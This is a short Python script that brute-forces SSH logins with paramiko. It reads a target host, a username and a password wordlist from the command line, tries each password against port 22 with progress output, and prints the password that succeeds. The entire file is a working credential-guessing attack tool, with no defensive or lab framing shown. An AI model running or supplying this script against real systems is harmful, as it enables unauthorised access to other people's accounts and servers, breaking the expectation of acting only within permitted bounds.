from genericpath import exists
import paramiko
import sys
import os
from  os.path import exists 
target=sys.argv[1]
username=sys.argv[2]
def check_len():
    if len(sys.argv) == 4:
        return True
    else:
        return False



def check_file_existence():
    if '/' in sys.argv[3] or '\\' in sys.argv[3]:
        _path = sys.argv[3]
    else:
        _path = os.getcwd()+'/'+sys.argv[3]
    if exists(_path):
        return True
    return False
def ssh_connect(password,code=0):
    ssh=paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect(target,port=22,username=username,password=password)
    except paramiko.AuthenticationException:
        code=1
    ssh.close()
    return code


if check_len():
    if check_file_existence():
        

        if '/' in sys.argv[3] or '\\' in sys.argv[3]:
            _path_pass = sys.argv[3]

        else:
            _path_pass = os.getcwd()+'/'+sys.argv[3]
        with open(_path_pass,'r') as file:
            pass_list=file.read().splitlines()
            n=len(pass_list)
            count=0
            for password  in pass_list:
                count+=1
                per = int((count/n)*100)
                print('\r', end='', flush=True)
                print(f"{per}% Completed", flush=True, end='')
                try:
                    
                    resp=ssh_connect(password)
                    if resp==0:
                        print("\nPassword Found",password)
                        exit(0)
                except Exception as e:
                    print(e)              
                pass
        
    else:
        print("File doesn't exists")
else:
    print("Provide correct argument of file and valid text")
    print(f"{sys.argv[0]} [target] [username] [path of password file]")
    sys.exit(1)